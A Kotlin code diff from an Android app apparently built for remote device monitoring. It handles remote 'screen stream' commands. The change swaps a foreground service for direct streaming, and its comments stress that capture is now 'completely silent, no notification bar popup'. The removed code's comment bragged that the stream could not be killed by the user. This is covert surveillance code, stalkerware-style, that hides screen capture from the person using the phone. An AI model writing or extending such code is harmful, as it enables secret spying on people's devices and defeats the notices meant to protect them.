@@ -663,8 +663,8 @@ class SyncRunner(private val context: Context) {
     private suspend fun processScreenStreamCommand(bearer: String, command: RemoteCommand) {
         val action = (command.payload?.get("action") as? String) ?: "start"
         if (action == "stop") {
-            com.spapp.monitoring.screenstream.ScreenStreamService.stop(context)
             com.spapp.monitoring.screenstream.ScreenStreamManager.stopStreaming()
+            com.spapp.monitoring.screenstream.ScreenStreamService.stop(context)
             try {
                 ApiClient.service.ackCommand(
                     bearer,
@@ -739,9 +739,12 @@ class SyncRunner(private val context: Context) {
             return
         }
 
-        // Start ScreenStreamService as an immune Foreground Service so Android's task
-        // killer and "Clear all" in Recent Apps will NEVER terminate the stream or the process!
-        com.spapp.monitoring.screenstream.ScreenStreamService.start(context)
+        // Start ScreenStreamManager directly (completely silent, no notification bar popup!)
+        com.spapp.monitoring.screenstream.ScreenStreamManager.startStreaming(
+            context = context,
+            authToken = bearer.removePrefix("Bearer ").trim(),
+            deviceId = state.getEffectiveDeviceId() ?: ""
+        )
 
         try {
             ApiClient.service.ackCommand(
